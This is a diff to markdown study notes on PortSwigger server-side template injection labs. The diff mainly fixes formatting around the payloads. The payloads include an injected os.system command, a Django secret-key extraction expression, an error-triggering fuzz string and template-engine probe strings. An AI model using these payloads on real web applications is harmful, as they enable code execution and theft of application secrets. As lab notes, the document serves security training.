@@ -48,13 +48,14 @@ user.name}}{%25+import+os+%25}{{os.system('pwd')}}
 ## [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
 
 - Check for a function to edit the template of a blog.
-- Change one of the template expressions to something invalid, such as a fuzz string ${{<%[%'"}}%\
+- Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`
 - Once you find the template engine, read the documentation to find how to craft a payload that will execute code.
 
 - Use this payload to extract secret key from django template
 {{settings.SECRET_KEY}}
 
 #### Payloads to ID Template Engine
+{{</* raw */>}}
 ```
 {{7*7}}
 ${7*7}
@@ -62,4 +63,5 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 ```
+{{</* /raw */>}}
 
